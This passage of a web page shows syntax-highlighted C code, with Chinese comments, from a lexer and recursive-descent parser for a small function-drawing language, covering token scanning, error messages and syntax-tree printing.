operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> loop <span class="token operator">&lt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>TokenTab<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>TokenTab<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> loop<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//遍历TokenTab表</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>TokenTab<span class="token punctuation">[</span>loop<span class="token punctuation">]</span><span class="token punctuation">.</span>lexeme<span class="token punctuation">,</span> IDString<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">return</span> TokenTab<span class="token punctuation">[</span>loop<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//判断在字符表中就返回该记号</span><span class="token punctuation">&#125;</span>Token errortoken<span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>errortoken<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>Token<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//先将errortoken置空</span>errortoken<span class="token punctuation">.</span>type <span class="token operator">=</span> ERRTOKEN<span class="token punctuation">;</span><span class="token comment">//然后填入出错记号</span><span class="token keyword">return</span> errortoken<span class="token punctuation">;</span><span class="token comment">//返回出错记号</span><span class="token punctuation">&#125;</span><span class="token comment">//获得一个记号</span><span class="token keyword">extern</span> Token <span class="token function">GetToken</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>Token token<span class="token punctuation">;</span><span class="token keyword">char</span> Char<span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>token<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>Token<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//token置空</span><span class="token function">EmptyTokenString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//清空记号缓冲区</span>token<span class="token punctuation">.</span>lexeme <span class="token operator">=</span> TokenBuffer<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token comment">//此循环用来过滤掉源程序中的空格、TAB、回车等分隔符，文件结束返回空记号</span><span class="token punctuation">&#123;</span>Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//从源程序读字符</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Char <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token comment">//读出错</span><span class="token punctuation">&#123;</span>token<span class="token punctuation">.</span>type <span class="token operator">=</span> NONTOKEN<span class="token punctuation">;</span><span class="token keyword">return</span> token<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Char <span class="token operator">==</span> <span class="token char">'\n'</span><span class="token punctuation">)</span>LineNo<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//行号+1</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isspace</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//遇到空格该记号肯定已经完成，退出循环</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">AddCharTokenString</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//如果不是上面的那些分隔符，就先加入缓冲区</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isalpha</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//如果是英文字母，一定是函数、关键字、PI、E等</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isalnum</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//如果是字母或数字</span><span class="token function">AddCharTokenString</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//加入缓冲区</span><span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">BackChar</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//退回缓冲区</span>token <span class="token operator">=</span> <span class="token function">JudgeKeyToken</span><span class="token punctuation">(</span>TokenBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//判断是否在记号表中</span>token<span class="token punctuation">.</span>lexeme <span class="token operator">=</span> TokenBuffer<span class="token punctuation">;</span><span class="token keyword">return</span> token<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isdigit</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//如果是数字，一定是常量</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isdigit</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">AddCharTokenString</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Char <span class="token operator">==</span> <span class="token char">'.'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">AddCharTokenString</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isdigit</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">AddCharTokenString</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">BackChar</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span>token<span class="token punctuation">.</span>type <span class="token operator">=</span> CONST_ID<span class="token punctuation">;</span>token<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token function">atof</span><span class="token punctuation">(</span>TokenBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> token<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token comment">//如果是其他符号</span><span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token char">';'</span><span class="token operator">:</span> token<span class="token punctuation">.</span>type <span class="token operator">=</span> SEMICO<span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token char">'('</span><span class="token operator">:</span> token<span class="token punctuation">.</span>type <span class="token operator">=</span> L_BRACKET<span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token char">')'</span><span class="token operator">:</span> token<span class="token punctuation">.</span>type <span class="token operator">=</span> R_BRACKET<span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token char">','</span><span class="token operator">:</span> token<span class="token punctuation">.</span>type <span class="token operator">=</span> COMMA<span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token char">'+'</span><span class="token operator">:</span> token<span class="token punctuation">.</span>type <span class="token operator">=</span> PLUS<span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token char">'-'</span><span class="token operator">:</span>Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Char <span class="token operator">==</span> <span class="token char">'-'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>Char <span class="token operator">!=</span> <span class="token char">'\n'</span> <span class="token operator">&amp;&amp;</span> Char <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">BackChar</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">GetToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">BackChar</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span>token<span class="token punctuation">.</span>type <span class="token operator">=</span> MINUS<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">case</span> <span class="token char">'/'</span><span class="token operator">:</span>Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Char <span class="token operator">==</span> <span class="token char">'/'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>Char <span class="token operator">!=</span> <span class="token char">'\n'</span> <span class="token operator">&amp;&amp;</span> Char <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">BackChar</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">GetToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">BackChar</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span>token<span class="token punctuation">.</span>type <span class="token operator">=</span> DIV<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">case</span> <span class="token char">'*'</span><span class="token operator">:</span>Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Char <span class="token operator">==</span> <span class="token char">'*'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>token<span class="token punctuation">.</span>type <span class="token operator">=</span> POWER<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">BackChar</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span>token<span class="token punctuation">.</span>type <span class="token operator">=</span> MUL<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">default</span><span class="token operator">:</span>token<span class="token punctuation">.</span>type <span class="token operator">=</span> ERRTOKEN<span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> token<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="Parser-cpp-1"><a href="#Parser-cpp-1" class="headerlink" title="Parser.cpp"></a>Parser.cpp</h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">"parser.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">"semantic.h"</span></span><span class="token comment">//#define Tree_trace(x) PrintSyntaxTree(x,1);</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">warning</span><span class="token punctuation">(</span>disable<span class="token operator">:</span> <span class="token number">4996</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">warning</span><span class="token punctuation">(</span>disable<span class="token operator">:</span> <span class="token number">4703</span><span class="token punctuation">)</span></span></span><span class="token keyword">double</span> Parameter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>Origin_x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> Origin_y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>Scale_x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> Scale_y <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>Rot_angle <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">static</span> Token token<span class="token punctuation">;</span><span class="token comment">//定义一个记号</span>   <span class="token comment">//辅助函数声明</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">FetchToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用词法分析器的GetToken，把得到的当前记录保存起来。如果得到的记号是非法输入errtoken，则指出一个语法错误</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">MatchToken</span><span class="token punctuation">(</span><span class="token keyword">enum</span> <span class="token class-name">Token_Type</span> The_Token<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//匹配当前记号</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">SyntaxError</span><span class="token punctuation">(</span><span class="token keyword">int</span> case_of<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//处理语法错误的子程序。根据错误的性质打印相关信息并且终止程序运行。错误性质可以根据传参不同来区分：SyntaxError（1）词法错   SyntaxError（2）语法错</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">ErrMsg</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> LineNo<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>descrip<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//打印错误信息</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">PrintSyntaxTree</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>root<span class="token punctuation">,</span> <span class="token keyword">int</span> indent<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//先序遍历打印语法树</span>   <span class="token comment">//非终结符递归子程序声明 有2类</span>   <span class="token comment">//第1类，语法分析，不构造语法树，因此语句的子程序均设计为过程->void类型的函数，非终结符的递归子程序声明</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Program</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//程序</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Statement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//语句</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">OriginStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Origin语句</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">RotStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Rot语句</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">ScaleStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Scale语句</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">ForStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//For语句</span>   <span class="token comment">//第2类，语法分析+构造语法树，因此表达式均设计为返回值为指向语法树节点的指针的函数。</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//表达式、二元加减运算表达式</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token function">Term</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//乘除运算表达式</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token function">Factor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//一元加减运算表达式</span> <span class="token comment">//把项和因子独立开处理解决了加减号与乘除号的优先级问题。在这几个过程的反复调用中，始终传递fsys变量的值，保证可以在出错的情况下跳过出错的符号，使分析过程得以进行下去。</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//幂运算表达式</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token function">Atom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//原子表达式</span>   <span class="token comment">//对外接口声明</span><span class="token keyword">extern</span> <span class="token keyword">void</span> <span class="token function">Parser</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>SrcFilePtr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//语法树构造函数声明</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token function">MakeExprNode</span><span class="token punctuation">(</span><span class="token keyword">enum</span> <span class="token class-name">Token_Type</span> opcode<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//通过词法分析器接口GetToken获得一个记号</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">FetchToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>token <span class="token operator">=</span> <span class="token function">GetToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>type <span class="token operator">==</span> ERRTOKEN<span class="token punctuation">)</span> <span class="token function">SyntaxError</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//如果得到的记号是非法输入errtoken，则指出一个语法错误</span><span class="token punctuation">&#125;</span><span class="token comment">//匹配当前记号</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">MatchToken</span><span class="token punctuation">(</span><span class="token keyword">enum</span> <span class="token class-name">Token_Type</span> The_Token<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>type <span class="token operator">!=</span> The_Token<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">SyntaxError</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//若失败，指出语法错误</span><span class="token punctuation">&#125;</span><span class="token function">FetchToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//若成功，获取下一个</span><span class="token punctuation">&#125;</span><span class="token comment">//语法错误处理</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">SyntaxError</span><span class="token punctuation">(</span><span class="token keyword">int</span> case_of<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>case_of<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span> <span class="token function">ErrMsg</span><span class="token punctuation">(</span>LineNo<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"错误记号 "</span><span class="token punctuation">,</span> token<span class="token punctuation">.</span>lexeme<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span> <span class="token function">ErrMsg</span><span class="token punctuation">(</span>LineNo<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"不是预期记号"</span><span class="token punctuation">,</span> token<span class="token punctuation">.</span>lexeme<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//打印错误信息</span><span class="token keyword">void</span> <span class="token function">ErrMsg</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> LineNo<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>descrip<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>string<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> msg<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sprintf</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> <span class="token string">"Line No %5d:%s %s !"</span><span class="token punctuation">,</span> LineNo<span class="token punctuation">,</span> descrip<span class="token punctuation">,</span> string<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span> <span class="token string">"error!"</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">CloseScanner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//先序遍历打印语法树，根-左-右</span><span class="token keyword">void</span> <span class="token function">PrintSyntaxTree</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>root<span class="token punctuation">,</span> <span class="token keyword">int</span> indent<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> temp<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>temp <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> temp <span class="token operator">&lt;=</span> indent<span class="token punctuation">;</span> temp<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//缩进</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>root<span class="token operator">-></span>OpCode<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> PLUS<span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> <span class="token string">"+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> MINUS<span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> <span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> MUL<span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> DIV<span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> POWER<span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> <span class="token string">"**"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> FUNC<span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%x\n"</span><span class="token punctuation">,</span> root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseFunc<span class="token punctuation">.</span>MathFuncPtr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> CONST_ID<span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%f\n"</span><span class="token punctuation">,</span> root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseConst<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> T<span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> <span class="token string">"T"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Error Tree Node !\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token operator">-></span>OpCode <span class="token operator">==</span> CONST_ID <span class="token operator">||</span> root<span class="token operator">-></span>OpCode <span class="token operator">==</span> T<span class="token punctuation">)</span> <span class="token comment">//叶子节点返回</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment">//常数和参数只有叶子节点 常数：右值；参数：左值地址</span><span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token operator">-></span>OpCode <span class="token operator">==</span> FUNC<span class="token punctuation">)</span><span class="token comment">//递归打印一个孩子节点</span><span class="token function">PrintSyntaxTree</span><span class="token punctuation">(</span>root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseFunc<span class="token punctuation">.</span>Child<span class="token punctuation">,</span> indent <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//函数有孩子节点和指向函数名的指针</span><span class="token keyword">else</span><span class="token comment">//递归打印两个孩子节点</span><span class="token punctuation">&#123;</span><span class="token comment">//二元运算：左右孩子的内部节点</span><span class="token function">PrintSyntaxTree</span><span class="token punctuation">(</span>root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseOperater<span class="token punctuation">.</span>Left<span class="token punctuation">,</span> indent <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">PrintSyntaxTree</span><span class="token punctuation">(</span>root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseOperater<span class="token punctuation">.</span>Right<span class="token punctuation">,</span> indent <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token 